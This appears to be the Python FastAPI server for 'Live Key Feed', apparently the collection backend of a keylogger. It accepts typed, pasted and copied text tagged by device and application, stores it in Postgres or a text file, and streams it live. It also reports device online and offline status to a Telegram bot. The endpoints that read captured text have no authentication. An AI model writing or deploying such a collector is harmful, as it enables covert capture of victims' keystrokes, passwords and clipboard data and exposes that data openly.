import asyncio
import json
import os
import time
import urllib.parse
import urllib.request
from contextlib import asynccontextmanager
from collections import deque
from pathlib import Path
from typing import Deque, Dict

from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
from pydantic import BaseModel
import psycopg

MAX_MESSAGES = 200
BASE_DIR = Path(__file__).resolve().parent
LOG_PATH = BASE_DIR / "text.txt"
HTML_PATH = BASE_DIR / "index.html"
messages: Deque[Dict[str, object]] = deque(maxlen=MAX_MESSAGES)
devices: Dict[str, Dict[str, object]] = {}
device_online_states: Dict[str, bool] = {}
DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
SERVICE_STARTED_AT = time.time()
DEVICE_HEARTBEAT_INTERVAL = 30
DEVICE_OFFLINE_AFTER = 90
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()
TELEGRAM_UPTIME_INTERVAL = max(
    60, int(os.getenv("TELEGRAM_UPTIME_INTERVAL_SECONDS", "900"))
)


def telegram_configured():
    return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)


def send_telegram_message(text):
    if not telegram_configured():
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = urllib.parse.urlencode(
        {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    ).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"Telegram HTTP {response.status}")
    except Exception as error:
        print(f"Could not send Telegram uptime notification: {error}")


def notify_device_status(device_id, device_name, online):
    status = "online" if online else "offline"
    send_telegram_message(
        f"Device {status}: {device_name} ({device_id})"
    )


async def device_status_loop():
    while True:
        await asyncio.sleep(DEVICE_HEARTBEAT_INTERVAL)
        now = int(time.time() * 1000)
        for device in list(devices.values()):
            device_id = str(device["id"])
            last_seen = int(device.get("last_seen", 0))
            online = now - last_seen <= DEVICE_OFFLINE_AFTER * 1000
            previous = device_online_states.get(device_id)
            device_online_states[device_id] = online
            if previous is True and not online:
                await asyncio.to_thread(
                    notify_device_status,
                    device_id,
                    device.get("name", "Unknown device"),
                    False,
                )


async def telegram_uptime_loop():
    await asyncio.to_thread(
        send_telegram_message,
        "Live Key Feed is online.",
    )
    while True:
        await asyncio.sleep(TELEGRAM_UPTIME_INTERVAL)
        await asyncio.to_thread(
            send_telegram_message,
            f"Live Key Feed heartbeat: healthy for {int(time.time() - SERVICE_STARTED_AT)} seconds.",
        )


@asynccontextmanager
async def lifespan(_app):
    heartbeat_task = None
    device_status_task = asyncio.create_task(device_status_loop())
    if telegram_configured():
        heartbeat_task = asyncio.create_task(telegram_uptime_loop())
    elif TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID:
        print("Telegram uptime notifications need both TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")

    try:
        yield
    finally:
        tasks = [device_status_task]
        if heartbeat_task:
            tasks.append(heartbeat_task)
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


def load_file_messages():
    try:
        with LOG_PATH.open("r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        return []

    parsed = []
    for line in lines:
        if "|" not in line:
            continue
        parts = line.split("|", 5)
        try:
            if len(parts) == 2:
                ts, text = parts
                device_id = "unknown"
                device_name = "Unknown device"
                is_pasted = False
                is_copied = False
            elif len(parts) == 5:
                ts, device_id, device_name, pasted_value, text = parts
                is_pasted = pasted_value == "1"
                is_copied = False
            elif len(parts) == 6:
                ts, device_id, device_name, pasted_value, copied_value, text = parts
                is_pasted = pasted_value == "1"
                is_copied = copied_value == "1"
            else:
                ts, device_id, device_name, text = parts
                is_pasted = False
                is_copied = False
            parsed.append(
                {
                    "id": int(ts),
                    "text": text.strip(),
                    "time": int(ts),
                    "device_id": device_id,
                    "device_name": device_name,
                    "app_name": "Unknown app",
                    "is_pasted": is_pasted,
                    "is_copied": is_copied,
                }
            )
        except ValueError:
            continue
    return parsed


def load_text_messages():
    global messages
    parsed = []
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        """
                        SELECT id, text, device_id, device_name, app_name, time, is_pasted, is_copied
                        FROM messages
                        ORDER BY time DESC
                        LIMIT %s
                        """,
                        (MAX_MESSAGES,),
                    )
                    rows = cursor.fetchall()
            parsed = [
                {
                    "id": row[0],
                    "text": row[1],
                    "device_id": row[2],
                    "device_name": row[3],
                    "app_name": row[4],
                    "time": row[5],
                    "is_pasted": row[6],
                    "is_copied": row[7],
                }
                for row in reversed(rows)
            ]
        except Exception as error:
            print(f"Could not load Supabase messages: {error}")

    if not parsed:
        parsed = load_file_messages()
    messages = deque(parsed[-MAX_MESSAGES:], maxlen=MAX_MESSAGES)
    for item in messages:
        devices[str(item["device_id"])] = {
            "id": item["device_id"],
            "name": item["device_name"],
            "last_seen": item["time"],
            "started_at": item["time"],
            "joined_at": item["time"],
        }


def load_devices():
    if not DATABASE_URL:
        return

    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(
                    """
                    SELECT device_id, device_name, last_seen, started_at, joined_at
                    FROM devices
                    ORDER BY last_seen DESC
                    """
                )
                rows = cursor.fetchall()
        for device_id, device_name, last_seen, started_at, joined_at in rows:
            devices[str(device_id)] = {
                "id": device_id,
                "name": device_name,
                "last_seen": last_seen,
                "started_at": started_at,
                "joined_at": joined_at,
            }
            device_online_states[str(device_id)] = (
                int(time.time() * 1000) - int(last_seen)
                <= DEVICE_OFFLINE_AFTER * 1000
            )
    except Exception as error:
        print(f"Could not load Supabase devices: {error}")


def save_message(item):
    if not DATABASE_URL:
        write_text_log()
        return

    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO messages (id, text, device_id, device_name, app_name, time, is_pasted, is_copied)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                """,
                (
                    item["id"],
                    item["text"],
                    item["device_id"],
                    item["device_name"],
                    item["app_name"],
                    item["time"],
                    item["is_pasted"],
                    item["is_copied"],
                ),
            )


def save_device(device_id, device_name, last_seen, started_at, joined_at):
    devices[device_id] = {
        "id": device_id,
        "name": device_name,
        "last_seen": last_seen,
        "started_at": started_at,
        "joined_at": joined_at,
    }
    if not DATABASE_URL:
        return

    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO devices (device_id, device_name, last_seen, started_at, joined_at)
                VALUES (%s, %s, %s, %s, %s)
                ON CONFLICT (device_id) DO UPDATE SET
                    device_name = EXCLUDED.device_name,
                    last_seen = EXCLUDED.last_seen,
                    started_at = EXCLUDED.started_at
                """,
                (device_id, device_name, last_seen, started_at, joined_at),
            )


def write_text_log():
    line_text = "\n".join(
        f"{int(item['time'])}|{item['device_id']}|{item['device_name']}|{1 if item.get('is_pasted') else 0}|{1 if item.get('is_copied') else 0}|{item['text']}"
        for item in list(messages)
    )
    with LOG_PATH.open("w", encoding="utf-8") as f:
        f.write(line_text)


class MessageInput(BaseModel):
    text: str
    device_id: str = "unknown"
    device_name: str = "Unknown device"
    app_name: str = "Unknown app"
    is_pasted: bool = False
    is_copied: bool = False


class DeviceHeartbeat(BaseModel):
    device_id: str
    device_name: str = "Unknown device"
    started_at: int


app = FastAPI(title="Live Key Feed", lifespan=lifespan)
load_text_messages()
load_devices()


@app.get("/")
async def root():
    return FileResponse(HTML_PATH)


@app.get("/messages")
async def fetch_messages():
    return JSONResponse(list(messages))


@app.get("/api/devices")
async def fetch_devices():
    now = int(time.time() * 1000)
    result = []
    for device in devices.values():
        last_seen = int(device.get("last_seen", 0))
        started_at = int(device.get("started_at", last_seen))
        age_seconds = max(0, (now - last_seen) // 1000)
        online = age_seconds <= DEVICE_OFFLINE_AFTER
        uptime_end = now if online else last_seen
        result.append(
            {
                **device,
                "online": online,
                "status": "Online" if online else "Offline",
                "last_seen_age_seconds": age_seconds,
                "offline_after_seconds": DEVICE_OFFLINE_AFTER,
                "uptime_seconds": max(0, (uptime_end - started_at) // 1000),
            }
        )
    return JSONResponse(result)


@app.post("/api/devices/heartbeat")
async def device_heartbeat(
    payload: DeviceHeartbeat, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)

    device_id = payload.device_id.strip()
    device_name = payload.device_name.strip() or "Unknown device"
    if not device_id:
        return JSONResponse({"ok": False, "error": "missing device_id"}, status_code=400)

    now = int(time.time() * 1000)
    existing_device = devices.get(device_id, {})
    joined_at = int(existing_device.get("joined_at", now))
    was_online = device_online_states.get(device_id)
    if was_online is None and device_id in devices:
        was_online = now - int(devices[device_id].get("last_seen", 0)) <= (
            DEVICE_OFFLINE_AFTER * 1000
        )
    try:
        save_device(
            device_id,
            device_name,
            now,
            payload.started_at,
            joined_at,
        )
    except Exception as error:
        print(f"Could not save device heartbeat: {error}")
        return JSONResponse(
            {"ok": False, "error": "device storage unavailable"}, status_code=503
        )
    device_online_states[device_id] = True
    if was_online is not True:
        await asyncio.to_thread(
            notify_device_status, device_id, device_name, True
        )
    return JSONResponse({"ok": True})


@app.post("/api/messages")
async def add_message(payload: MessageInput, x_api_key: str | None = Header(default=None)):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)

    text = payload.text.strip()
    if not text:
        return JSONResponse({"ok": False, "error": "empty message"})

    now = int(time.time() * 1000)
    device_id = payload.device_id.strip() or "unknown"
    device_name = payload.device_name.strip() or "Unknown device"
    app_name = payload.app_name.strip() or "Unknown app"
    is_pasted = payload.is_pasted
    is_copied = payload.is_copied
    previous_device = devices.get(device_id, {})
    devices[device_id] = {
        "id": device_id,
        "name": device_name,
        "last_seen": now,
        "started_at": previous_device.get("started_at", now),
        "joined_at": previous_device.get("joined_at", now),
    }
    device_online_states[device_id] = True
    item = {
        "id": now,
        "text": text,
        "time": now,
        "device_id": device_id,
        "device_name": device_name,
        "app_name": app_name,
        "is_pasted": is_pasted,
        "is_copied": is_copied,
    }
    try:
        save_message(item)
    except Exception as error:
        print(f"Could not save message: {error}")
        return JSONResponse(
            {"ok": False, "error": "message storage unavailable"}, status_code=503
        )
    messages.append(item)
    return JSONResponse({"ok": True, "message": item})


@app.get("/events")
async def events(request: Request):
    async def event_generator():
        last_seen = max((int(item["id"]) for item in messages), default=0)
        while True:
            for msg in list(messages):
                msg_id = int(msg["id"])
                if msg_id > last_seen:
                    yield f"data: {json.dumps(msg)}\n\n"
                    last_seen = msg_id
            if await request.is_disconnected():
                break
            await asyncio.sleep(0.5)

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.get("/health")
async def health():
    return {
        "ok": True,
        "count": len(messages),
        "started_at": int(SERVICE_STARTED_AT * 1000),
        "uptime_seconds": int(time.time() - SERVICE_STARTED_AT),
    }


if __name__ == "__main__":
    import uvicorn

    port = int(os.getenv("PORT", "8000"))
    uvicorn.run("app:app", host="0.0.0.0", port=port, reload=False)
